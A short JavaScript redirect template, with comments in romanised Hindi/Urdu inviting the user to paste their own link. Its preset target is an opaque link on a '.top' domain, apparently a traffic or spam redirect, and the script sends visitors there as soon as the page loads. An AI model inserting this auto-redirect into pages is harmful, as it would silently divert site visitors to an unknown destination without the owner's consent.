// ============================================
// REDIRECT CONFIGURATION
// Neeche apni redirect link paste karein
// Ya settings page se bhi change kar sakte hain
// ============================================

var redirectURL = "https://search.link347xx.top/WhDMSKCtF"; // <-- Yahan apni link daalein, e.g. "https://google.com"

// ============================================
// REDIRECT LOGIC — Isko change karne ki zaroorat nahi
// ============================================
(function () {
  if (redirectURL && redirectURL.trim() !== "") {
    window.location.href = redirectURL.trim();
  }
})();
